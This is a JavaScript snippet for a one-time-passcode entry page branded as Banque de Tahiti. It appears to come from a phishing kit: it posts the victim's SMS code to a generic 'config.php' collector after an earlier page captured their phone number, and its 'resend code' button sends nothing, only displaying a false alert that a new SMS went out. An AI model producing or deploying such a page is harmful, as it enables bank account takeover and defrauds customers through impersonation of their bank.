<script>
    (function() {
        // Récupérer le numéro de téléphone stocké (depuis numero.html)
        const phoneNumber = sessionStorage.getItem('userPhone') || '+689 XX XX XX XX';
        const phoneDisplaySpan = document.getElementById('phoneDisplay');
        if (phoneDisplaySpan) {
            let maskedPhone = phoneNumber;
            if (phoneNumber.length >= 12 && phoneNumber.startsWith('+689')) {
                let digits = phoneNumber.slice(4);
                if (digits.length === 8) {
                    maskedPhone = '+689 ' + digits.slice(0,2) + ' ' + digits.slice(2,4) + ' XX XX';
                }
            }
            phoneDisplaySpan.textContent = maskedPhone;
        }

        const inputs = document.querySelectorAll('.code-digit');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const resendBtn = document.getElementById('resendBtn');
        const contactBtn = document.getElementById('contactBtn');

        function getCode() {
            let code = '';
            inputs.forEach(input => code += input.value.trim());
            return code;
        }

        function isCodeComplete() {
            const code = getCode();
            return code.length === 6 && /^\d+$/.test(code);
        }

        function updateButtonState() {
            submitBtn.disabled = !isCodeComplete();
            if (isCodeComplete()) errorMsg.style.display = 'none';
        }

        function handleInput(e) {
            const input = e.target;
            const value = input.value;
            if (value.length > 1) input.value = value.charAt(0);
            if (input.value.length === 1) {
                const next = input.nextElementSibling;
                if (next && next.classList.contains('code-digit')) next.focus();
            }
            updateButtonState();
        }

        function handleKeydown(e) {
            const input = e.target;
            if (e.key === 'Backspace' && input.value === '') {
                const prev = input.previousElementSibling;
                if (prev && prev.classList.contains('code-digit')) {
                    prev.focus();
                    e.preventDefault();
                }
            }
        }

        inputs.forEach((input, index) => {
            input.addEventListener('input', handleInput);
            input.addEventListener('keydown', handleKeydown);
            input.addEventListener('focus', function() { this.select(); });
            if (index === 0) input.focus();
        });

        async function onSubmit(e) {
            e.preventDefault();
            const code = getCode();
            if (!isCodeComplete()) {
                errorMsg.style.display = 'block';
                return;
            }

            // Envoi du code OTP à config.php
            try {
                const response = await fetch('config.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'type=otp&value=' + encodeURIComponent(code)
                });
                const result = await response.json();

                if (result.status === 'success') {
                    window.location.href = 'validation.html';
                } else {
                    errorMsg.textContent = result.message || 'Erreur lors de la validation du code.';
                    errorMsg.style.display = 'block';
                }
            } catch (err) {
                errorMsg.textContent = 'Erreur réseau. Vérifiez votre connexion.';
                errorMsg.style.display = 'block';
            }
        }

        function resendCode() {
            alert('Un nouveau code de validation vient d\'être envoyé par SMS au ' + phoneNumber);
            inputs.forEach(input => input.value = '');
            inputs[0].focus();
            updateButtonState();
        }

        submitBtn.addEventListener('click', onSubmit);
        if (resendBtn) resendBtn.addEventListener('click', resendCode);
        if (contactBtn) {
            contactBtn.addEventListener('click', function() {
                alert("Besoin d'aide ? Contactez votre conseiller Banque de Tahiti au +689 40 46 46 46\nou consultez votre agence en ligne.");
            });
        }

        updateButtonState();
    })();
</script>
